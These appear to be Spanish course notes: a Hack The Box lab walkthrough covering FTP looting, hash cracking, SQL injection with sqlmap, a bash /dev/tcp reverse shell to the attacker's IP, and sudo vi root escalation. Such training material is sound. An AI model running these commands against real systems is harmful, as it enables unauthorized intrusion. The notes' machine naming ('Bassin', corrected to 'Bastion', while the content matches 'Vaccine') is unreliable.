> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 32**
> **Módulo:** MODULO3
> **Tema:** Clase 32
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 32. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y objetivos de la sesión

Esta sesión la imparte **Castillo** (Carlos Castillo, el tercer profesor del máster, que lleva tiempo sin aparecer).

Es una clase de **repaso de la máquina** "**Bassin**" (Tier 2 de Hack The Box) que Dani hizo la clase anterior pero que quedó confusa, especialmente la parte de SQL Injection y la escalada de privilegios con vi.

**El enfoque de Castillo:** lento pero bien.

No interesa terminar la máquina corriendo; interesa que cada paso se entienda.

Se van por caminos que parecen prometedores pero no lo son --- intencionalmente --- para que el grupo aprenda a reconocer los rabbit holes.

**Roadmap del máster** actualizado por Castillo: - Esta semana y la siguiente: cerrar el Tier 2 del Starting Point. - Dos semanas después: comienza el módulo de **hacking web** en profundidad (2 semanas mínimo de SQL Injection manual, CSRF, LFI, Path Traversal, XXE, XSS). - Final del módulo web: práctica real de auditoría web con informe. - Posterior: HTB con licencia pagada (la facilita Evolve) + máquinas de dificultad media/alta. - Recta final: Active Directory, pivoting, movimiento lateral y escalada de privilegios avanzada.

**Nota sobre HTB y el perfil profesional:** tener 60-70 máquinas de HTB en el perfil es un diferenciador muy valorado en entrevistas.

Con la aparición de IAs como Claude Mythos que pueden resolver máquinas automáticamente, el valor irá bajando progresivamente, pero hoy en día sigue siendo relevante.

## 2.

Reconocimiento y enumeración de la máquina Bassin

### Nmap en dos fases

\# Fase 1: descubrimiento rápido

```bash
nmap \--min-rate 5000 IP_OBJETIVO
```

\# Fase 2: análisis en profundidad

```bash
nmap -sVC -p 21,22,80 IP_OBJETIVO
```

Resultado: - **Puerto 21** → FTP con sesión anónima permitida (detectado por `-sC`). - **Puerto 22** → SSH.

Sin credenciales, poco que hacer aquí de momento. - **Puerto 80** → HTTP con login PHP.

**Consejo sobre TTL:** 63 en vez de 64 → máquina Linux detrás de la VPN de HTB (1 salto intermedio resta 1 al TTL esperado).

**Consejo sobre guardado de resultados Nmap:** - `-oN fichero` → formato texto normal. - `-oG fichero` → formato grepeable (el preferido de Castillo para filtrar con `grep`). - `-oA prefijo` → guarda los tres formatos a la vez. - Alternativa: redirigir con `>` el output directamente a un fichero. - En exámenes y auditorías reales: **siempre guardar los resultados**.

Una herramienta clave que el grupo irá usando para organizar el trabajo.

## 3.

FTP (puerto 21) --- Sesión anónima y descarga del ZIP

ftp -a IP_OBJETIVO \# Conexión anónima directa

\# Dentro:

```bash
ls \# Listar → aparece backup.zip
```

pwd \# Comprobar directorio actual (puede no ser la raíz)

mget \* \# Descargar todos los ficheros

exit

> [!important] **Consejo importante:** en el FTP, hacer siempre `cd ..` para verificar si hay contenido en directorios superiores a la raíz del servicio.

En entornos reales puede haber miles de ficheros, y revisar los permisos ayuda a distinguir directorios de ficheros antes de intentar descargar.

**El ZIP está protegido con contraseña.** El nombre "backup.zip" es una pista: es el código fuente de la web, una versión anterior.

Al tener el código fuente, se puede leer la lógica de autenticación completa.

**Tip técnico:** usar el comando `file backup.zip` antes de intentar descomprimirlo para confirmar que realmente es un ZIP y no otro tipo de fichero con extensión engañosa.

## 4.

Romper el ZIP con zip2john y John

\# Extraer el hash del ZIP

zip2john backup.zip \> hash.txt

\# Romper el hash con John

john hash.txt \--wordlist=/usr/share/wordlists/rockyou.txt

\# Si ya se había crackeado antes: ver la contraseña guardada

john \--show hash.txt

**Cómo funciona zip2john:** extrae el "núcleo" del ZIP --- el hash que protege el fichero --- en un formato que John puede atacar.

El hash queda guardado internamente por John, por lo que relanzar `john --show` sin el diccionario devuelve la contraseña si ya fue crackeada anteriormente.

**John vs Hashcat para ZIPs:** - **John** es la opción recomendada para ZIPs porque detecta el tipo de hash automáticamente y la integración con zip2john es directa. - **Hashcat** puede hacer lo mismo pero requiere especificar el modo manualmente (`-m 17200` para PKZIP) y da más problemas de configuración en este contexto.

Hashcat brilla cuando se conoce el tipo exacto de hash y se tienen múltiples GPUs (el profesor mencionó haber usado un rack de 9 GPUs para crackear bases de datos completas en auditorías reales).

**El cracking de hashes es local:** no genera ningún tráfico de red hacia la máquina objetivo.

Se puede hacer en cualquier momento sin riesgo de ser detectado.

## 5.

Análisis del código fuente del ZIP (index.php)

El ZIP contiene `index.php` (código fuente del login) y un `style.css` (irrelevante para hacking).

> [!important] **Concepto clave: código fuente vs. código visible:** - Lo que se ve con `Ctrl+U` en el navegador es el **HTML renderizado** --- solo el frontend. - El **código PHP** nunca aparece en el navegador porque el servidor lo interpreta y ejecuta antes de enviar la respuesta.

Solo queda el resultado HTML. - Un backup que contiene el código fuente es muy valioso porque revela la lógica interna: consultas SQL, credenciales hardcodeadas, algoritmos de hashing, etc.

**Del código fuente se extrae:** - Usuario hardcodeado: `admin` - Contraseña almacenada como hash MD5

## 6.

Romper el hash MD5 con CrackStation

**Cómo funciona CrackStation:** CrackStation (crackstation.net) tiene una base de datos pre-computada de millones de pares `valor → hash`.

Cuando recibe un hash, busca directamente en su base de datos y devuelve el valor original en segundos.

\# En el navegador, pegar el hash MD5 en crackstation.net

\# Resultado: qwerty789

**Alternativa con John:**

```bash
echo \"HASH_MD5\" \> md5hash.txt
```

john md5hash.txt \--format=raw-md5 \--wordlist=/usr/share/wordlists/rockyou.txt

**Herramienta para identificar el tipo de hash:** `hash-identifier` o la web **Decode.fr** (hash identifier).

Devuelven una lista ordenada de más a menos probable.

Útil cuando no se conoce el algoritmo.

**Lógica inversa del MD5:** la aplicación toma lo que el usuario introduce en el campo de contraseña, lo hashea en MD5 y lo compara con el hash almacenado.

Por eso no se puede meter el hash directamente en el campo --- hay que introducir la contraseña original (`qwerty789`) para que la aplicación la hashee y coincida.

**Riesgo de CrackStation:** es un servicio externo.

No se garantiza privacidad de los hashes que se suben.

En entornos clasificados o con hashes sensibles, usar John o Hashcat localmente.

**Login conseguido:** `admin / qwerty789` → acceso al panel de la aplicación.

## 7.

SQL Injection --- Fundamentos teóricos explicados con pizarra

### Detectar si hay base de datos

La SQL Injection solo aplica cuando los datos provienen de una base de datos, no cuando están hardcodeados en el HTML.

El buscador del catálogo de coches filtra por tipo de coche (nombre, combustible, motor), lo que indica que consulta una base de datos.

**Primera prueba: comilla simple** `'`

Al introducir una comilla simple en el buscador, la aplicación devuelve un error SQL con la query interna --- mala práctica de desarrollo que expone información valiosa al atacante:

> [!warning] Error: unterminated quoted string\...

Esto confirma SQL Injection de tipo **error-based** (la aplicación muestra los errores SQL directamente).

### Por qué funciona la comilla --- explicación visual

La consulta que ejecuta el buscador por detrás es aproximadamente:

SELECT \* FROM cars WHERE name LIKE \'VALOR_DEL_BUSCADOR\'

Si el usuario introduce `elixir`, la consulta es:

SELECT \* FROM cars WHERE name LIKE \'elixir\'

Si el usuario introduce `elixir'`, la consulta rompe porque queda una comilla sin cerrar:

SELECT \* FROM cars WHERE name LIKE \'elixir\'\' ← error de sintaxis

El atacante puede **cerrar la consulta antes de tiempo** e inyectar SQL adicional:

SELECT \* FROM cars WHERE name LIKE \'elixir\' ORDER BY 5 \--\'

El `--` comenta todo lo que viene después, eliminando la comilla que sobra y cualquier condición adicional de la consulta original.

### Tipos de SQL Injection

Tipo Descripción
----------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 **Error-based** El servidor muestra el error SQL con información de la query.

Más fácil de detectar y explotar
**Blind SQLi** Sin feedback visual.

Se detecta por diferencias en el comportamiento (tiempo de carga, respuesta vacía vs. con datos).

Se explota columna por columna preguntando verdadero/falso
 **Time-based** Variante de Blind SQLi: se inyecta `SLEEP(5)` y si la respuesta tarda 5 segundos, la inyección funciona

**SQLMap en entornos reales:** genera muchísimo ruido y puede romper bases de datos en producción.

En auditorías reales: pedir permiso explícito antes de lanzarlo.

En HTB y preproducción: sin restricciones.

## 8.

SQL Injection automática con SQLMap

SQLMap necesita saber dónde está la vulnerabilidad y, como la página requiere login, necesita la cookie de sesión.

### Obtener la cookie de sesión

**Método 1 --- Inspector del navegador:** Clic derecho → Inspeccionar → Storage → Cookies → copiar valor de `PHPSESSID`.

**Método 2 --- Extensión Cookie Editor:** Extensión de Firefox que permite ver, copiar, editar e importar/exportar cookies en JSON.

Mucho más cómodo para auditorías web.

Instalar desde addons.mozilla.org buscando "Cookie Editor".

**Qué es una cookie de sesión:** Cuando se hace login, el servidor genera un identificador único y lo guarda en una cookie.

En cada petición posterior, el navegador manda esa cookie, el servidor la verifica y confirma que el usuario está autenticado.

Es el equivalente al "sello de discoteca" --- tras verificar el DNI (credenciales) una vez, el sello (cookie) evita tener que volver a comprobar.

**Flags de seguridad en cookies:** - `HttpOnly: true` → la cookie no es accesible por JavaScript (protege contra robo por XSS). - `Secure: true` → la cookie solo se envía por HTTPS (protege contra sniffing en texto claro).

En la máquina Bassin ambas están en `false` --- una vulnerabilidad reportable en un informe real.

**Las cookies de sesión cambian:** cada login genera una cookie diferente.

Si la cookie caduca (por defecto PHP la configura en \~24 minutos), hay que hacer login de nuevo para obtener una válida.

### Comando SQLMap con cookie

sqlmap -u \"http://IP/dashboard.php?search=test\" \\

\--cookie=\"PHPSESSID=VALOR_COPIADO\" \\

\--os-shell

- `-u` → URL con el parámetro vulnerable (puede ponerse cualquier valor en `search=`, SQLMap lo detecta automáticamente).
- `--cookie` → cookie de sesión para acceder a la página autenticada.
- `--os-shell` → intentar obtener shell del sistema operativo.

**Interacción con SQLMap:** cuando pregunta si seguir probando en otros parámetros → responder **N** (no) para no generar ruido adicional.

Cuando pregunta si el parámetro `search` es la vulnerabilidad → responder **Y** (sí).

Resultado: SQLMap identifica el parámetro como vulnerable y obtiene una shell como `postgres` (usuario de servicio de la base de datos).

## 9.

Mejorar la shell de SQLMap + escalada de privilegios con vi

La shell de SQLMap es inestable.

### Para estabilizarla:

\# En la shell de SQLMap --- lanzar reverse shell

bash -c \'bash -i \>& /dev/tcp/NUESTRA_IP_TUN0/4445 0\>&1\'

\# En Kali --- Netcat escuchando antes de lanzar lo anterior

nc -lvnp 4445

### Escalada de privilegios con vi (GTFOBins)

```bash
sudo -l
```

\# → postgres puede ejecutar /bin/vi /etc/postgresql/11/main/postgresql.conf como root sin contraseña

```bash
sudo /bin/vi /etc/postgresql/11/main/postgresql.conf
```

\# Dentro de vi:

:set shell=/bin/bash

:shell

\# → shell como root

```bash
cat /root/root.txt \# Flag final
```

## 10.

Conceptos y términos clave

Término en la transcripción Corrección / Aclaración
 --------------------------------------- -------------------------------------------------------------------------------------------------------------
 *Bassin / la de basin* **Bastion** -- nombre de la máquina HTB Tier 2
 *Castillo / el tatus* **Carlos Castillo** -- tercer profesor del máster (apodo: Castillo o Tatus)
 *el boceto / Bright App* **writeup** -- solución documentada paso a paso de una máquina CTF
 *zip to young / zip 2 juan* **zip2john** -- extrae el hash de un ZIP protegido para atacarlo con John
 *hascot / hascat* **Hashcat** -- herramienta de cracking de hashes (preferiblemente con GPU)
 *Crack Station / crackit station* **CrackStation** (crackstation.net) -- base de datos online de hashes pre-computados
 *decode.fr / la de los franceses fea* **Decode.fr** -- web con herramientas de encoding/decoding y hash identifier
 *hash identifier / hash identifyer* **hash-identifier** -- herramienta para identificar el tipo de hash
 *SQLI / Google Injection* **SQL Injection (SQLi)** -- vulnerabilidad que permite modificar consultas SQL
 *Blind SQLI / SQLI a ciegas* **Blind SQL Injection** -- SQLi sin feedback visual; se detecta por timing o comportamiento
 *el comentario de guión guión* `--` -- comentario SQL en MySQL/PostgreSQL; descarta el resto de la consulta
 *cookie de sesión / PHP SSID* `PHPSESSID` -- nombre de la cookie de sesión en aplicaciones PHP
 *HTTP Only / HTTP Only flag* `HttpOnly` -- flag de seguridad de cookie que impide acceso desde JavaScript
 *Secure flag* `Secure` -- flag que fuerza envío de cookie solo por HTTPS
 *Cookie Editor* **Cookie Editor** -- extensión de Firefox para gestionar cookies en auditorías web
 *the os shell / os shell* `--os-shell` -- flag de SQLMap para obtener shell del sistema operativo
 *Man in the middle* **MITM** (*Man In The Middle*) -- ataque de interceptación de tráfico de red
 *XSS / inyectar código de web* **XSS** (*Cross-Site Scripting*) -- inyección de código JavaScript en páginas web
 *order by / order byte* `ORDER BY` -- cláusula SQL usada en SQLi manual para determinar el número de columnas
 *GTFOBins* **GTFOBins** (gtfobins.github.io) -- referencia de escalada de privilegios con binarios
 *la extensión de Claude Mythos* **Claude Mythos** -- modelo avanzado de Anthropic con capacidades de ciberseguridad; muy pocos tienen acceso

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../transcripciones/Junio/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — SQL Injection, SQLMap, XXE
- [[../../transcripciones/Junio/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Metasploit, SQL Injection, SQLMap
- [[../../apuntes Chema/Maquinas/Vaccine (Tier 2) — Repaso en profundidad.md|Vaccine (Tier 2) — Repaso en profundidad]] — Pivoting / Movilidad Lateral, SQL Injection, SQLMap
- [[../../transcripciones/Julio/08.07.2026 Owasp Top 10 LFI Fundamentos.md|08.07.2026 Owasp Top 10 LFI Fundamentos]] — Metasploit, SQL Injection, XXE
- [[../../apuntes Andres/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — John / Hashcat, SQL Injection, SQLMap
- [[../../transcripciones/Junio/10.06.2026 HTB Starting Point 2 Repaso.md|10.06.2026 HTB Starting Point 2 Repaso]] — SQL Injection, SQLMap, XXE

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SQLMap|SQLMap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #csrf #escalada-privilegios #hack-the-box #ia #john #kali #lfi #linux #metasploit #netcat #nmap #pivoting #redes #reverse-shell #sqli #sqlmap #ssh #windows #xss #xxe
